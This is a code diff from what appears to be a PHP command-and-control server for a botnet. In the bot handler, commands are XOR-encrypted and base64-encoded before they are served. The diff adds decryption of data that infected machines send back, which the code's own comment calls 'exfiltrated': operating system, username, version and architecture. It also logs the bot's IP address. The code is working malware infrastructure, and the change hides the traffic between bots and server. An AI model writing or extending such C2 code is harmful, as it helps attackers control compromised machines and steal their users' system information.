@@ -60,12 +60,19 @@ if($_GET['p'] == "bot") {
 	$encryptedCommands = xor_commands($unencryptedCommands, $k);
 	print base64_encode($encryptedCommands);
 
+	// decrypt exfiltrated data
+	$botOs = xor_commands(base64_decode($_GET['os']), $k);
+	$botSystemname = xor_commands(base64_decode($_GET['username']), $k);
+	$botVersion = xor_commands(base64_decode($_GET['version']), $k);
+	$botOsDetail = xor_commands(base64_decode($_GET['osdetail']), $k);
+	$botArchitecture = xor_commands(base64_decode($_GET['architecture']), $k);
+
 	// filter html stuff
-	$botOs = strip_tags($_GET['os']);
-	$botSystemname = strip_tags($_GET['username']);
-	$botVersion = strip_tags($_GET['version']);
-	$botOsDetail = strip_tags($_GET['osdetail']);
-	$botArchitecture = strip_tags($_GET['architecture']);
+	$botOs = strip_tags($botOs);
+	$botSystemname = strip_tags($botSystemname);
+	$botVersion = strip_tags($botVersion);
+	$botOsDetail = strip_tags($botOsDetail);
+	$botArchitecture = strip_tags($botArchitecture);
 
 	// save bot parameter
 	$clientIpAddress = strip_tags($_SERVER["REMOTE_ADDR"]);
